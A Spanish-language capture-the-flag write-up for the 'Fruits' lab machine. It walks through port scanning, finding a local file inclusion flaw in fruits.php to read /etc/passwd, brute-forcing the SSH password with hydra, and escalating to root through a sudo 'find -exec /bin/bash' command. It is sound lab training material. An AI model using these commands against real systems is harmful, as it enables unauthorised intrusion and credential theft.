
# Writeup Template: Maquina `[ Fruits ]`
- **Enumeración de aplicación web**: Exploración de contenido web visible y oculto para detectar puntos de entrada.
- **Enumeración de servicios**: Identificación de los servicios que corren en los puertos abiertos, incluyendo versiones.
- **Escaneo de puertos TCP**: Detección de puertos abiertos en la máquina objetivo mediante escaneo TCP.
- **Fuzzing de rutas web**: Ataque de fuerza bruta sobre rutas de la web para descubrir archivos o directorios.
- **Inclusión de archivos locales (LFI)**: Explotación de vulnerabilidades que permiten incluir archivos locales del sistema objetivo.

- Tags: #Fruits
- Dificultad: `[ Facil ]`
- Plataforma: `[ The Hackers Labs ]`

---
## Configuracion del Entorno
**Nota:** Pagina oficcioal donde descargo los laboratorios: [The Hackers Labs](https://labs.thehackerslabs.com/)
- Descargamos el archivo **( .ova )**
- Descomprimimos el archivo **zip**
- Importamos el **ova** en **virtualBox**

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
192.168.100.39
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 192.168.100.39 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 192.168.100.39
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 192.168.100.39 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.100.39 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 192.168.100.39 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.57 ((DebianMantic))
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://192.168.100.39/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://192.168.100.39/
http://192.168.100.39/ [200 OK] Apache[2.4.57], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.57 (Debian)], IP[192.168.100.39], Title[Página de Frutas]
```
### Descubrimiento de Archivos y Rutas
```bash
gobuster dir -u http://192.168.100.39 -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 10 -x php,php.back,backup,txt,sh,html,js,java,py
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 1811]
/fruits.php           (Status: 200) [Size: 1]
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Revisando desde le codigo fuente tenemos un archivo **php**
```bash
# No funciona
<form action="[buscar.php](view-source:http://192.168.100.39/buscar.php)" method="GET">
```

Si accedemos a la siguiente ruta:
```bash
http://192.168.100.39/fruits.php
```

### Ejecucion del Ataque
Probamos apuntando si es vulnerable a **LFI**
```bash
wfuzz -c -t 50 -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -u "http://192.168.100.39/fruits.php?FUZZ=/etc/passwd" --hh=1
```

Tenemso un parametro que ahora verificamos que archivos podemos leer del sistema
```bash
wfuzz -c -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://192.168.100.39/fruits.php?file=FUZZ" --hh=1

# LFI
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                                                      
=====================================================================
000000258:   200        24 L     29 W       1128 Ch     "/etc/passwd"
```

Explitamos LFI
```bash
# Comandos para explotación
http://192.168.100.39/fruits.php?file=/etc/passwd
```

Tenemos a los usuarios del sistema:
```bash
<pre>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
mysql:x:102:110:MySQL Server,,,:/nonexistent:/bin/false
bananaman:x:1001:1001::/home/bananaman:/bin/bash
</pre>
```

Ahora con **hydra** realizaremos un ataque de fuerza bruta
```bash
hydra -l bananaman -P /usr/share/wordlists/rockyou.txt -f -t 4 ssh://192.168.100.39
```

Tenemos las credenciales para ganar acceso por **ssh**
```bash
[STATUS] 69.67 tries/min, 209 tries in 00:03h, 14344190 to do in 3431:38h, 4 active
[22][ssh] host: 192.168.100.39   login: bananaman   password: celtic
```
### Intrusion
Iniciamos la conexion por ssh
```bash
# Reverse shell o acceso inicial
ssh bananaman@192.168.100.39 # celtic
```

---

## Escalada de Privilegios

###### Usuario `[ bananaman ]`:
LIstando los permisos para este usuario tenemos lo siguiente:
```bash
sudo -l

User bananaman may run the following commands on Fruits:
    (ALL) NOPASSWD: /usr/bin/find
```

Explotamos el privilegio
```bash
# Comando para escalar al usuario: ( root )
bananaman@Fruits:~$ sudo -u root /usr/bin/find . -exec /bin/bash \; -quit
```

---

## Evidencia de Compromiso
Flag de usuario:
```bash
-rw-r--r-- 1 bananaman bananaman   33 mar 25  2024 user.txt
```

Flag de root:
```bash
-rw-r--r--  1 root root   33 mar 25  2024 root.txt
```

```bash
# Captura de pantalla o output final
root@Fruits:/home/bananaman# echo -e "\n[+] Hacked: $(whoami)\n"

[+] Hacked: root
```